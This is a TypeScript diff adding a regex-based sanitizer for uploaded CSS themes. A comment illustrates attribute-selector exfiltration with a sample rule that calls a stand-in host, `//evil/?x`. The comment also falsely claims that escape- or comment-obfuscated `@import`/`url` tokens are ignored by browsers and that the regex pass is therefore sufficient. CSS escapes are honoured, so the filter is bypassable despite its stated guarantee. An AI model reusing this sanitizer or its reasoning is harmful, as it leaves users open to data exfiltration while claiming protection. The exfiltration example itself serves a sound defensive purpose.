@@ -53,9 +53,32 @@ function saveUploadedThemes(themes: UploadedTheme[]): void {
 export function addUploadedTheme({ name, css }: { name: string; css: string }): UploadedTheme {
     // Date.now() alone is not unique for files added in the same millisecond.
     const id = `uploaded-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
-    const theme: UploadedTheme = { id, name, css };
+    const theme: UploadedTheme = { id, name, css: sanitizeThemeCss(css) };
     saveUploadedThemes([...getUploadedThemes(), theme]);
     return theme;
+}
+
+/**
+ * Reduce the attack surface of an imported theme's CSS. CSS cannot run scripts
+ * in modern browsers, but it can still load remote resources (tracking) and,
+ * combined with attribute selectors, exfiltrate field values to a remote server
+ * (e.g. `input[value^="x"] { background: url(//evil/?x) }`). So we drop remote
+ * fetches: `@import` rules are removed and every `url(...)` that is not an inline
+ * `data:` URI is replaced with `none`. UI-spoofing via layout rules remains
+ * possible, hence the "import only trusted themes" warning in the UI.
+ *
+ * Note: comment- or escape-obfuscated `@import`/`url` tokens are not honoured by
+ * browsers either, so this regex pass is sufficient in practice.
+ *
+ * @param css - raw CSS text
+ * @returns the sanitized CSS
+ */
+export function sanitizeThemeCss(css: string): string {
+    if (typeof css !== 'string') return '';
+    return css
+        .replace(/@import\b[^;]*;/gi, '')
+        .replace(/url\(\s*(['"]?)([^)'"]*)\1\s*\)/gi,
+            (match, _quote, target) => /^\s*data:/i.test(target) ? match : 'none');
 }
 
 /**
